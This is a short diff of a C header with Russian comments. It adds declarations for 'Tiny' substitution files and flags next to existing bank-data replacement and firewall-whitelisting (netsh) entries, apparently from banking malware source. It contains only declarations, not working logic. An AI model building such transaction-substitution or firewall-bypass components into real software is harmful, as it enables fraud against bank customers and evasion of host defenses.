@@ -185,6 +185,10 @@ extern CSSTR CBankReplacement[]; //имя файла хранящий что подменять
 extern CSSTR CBankFlagUpdate[]; //флаг для запуска подмены (был создан файл подмены)
 extern CSSTR CBankRestFixed[]; //файл с данными о подмене
 
+//для Tiny
+extern CSSTR TinyReplacement[]; //имя файла хранящий что подменять
+extern CSSTR TinyFlagUpdate[]; //флаг для запуска подмены (был создан файл подмены)
+
 //команда для добавления в список доверенных браундмаузера
 extern CSSTR NetshFirewallWinXp[]; //для windows XP
 extern CSSTR NetshFirewallWin7[]; //для windows 7
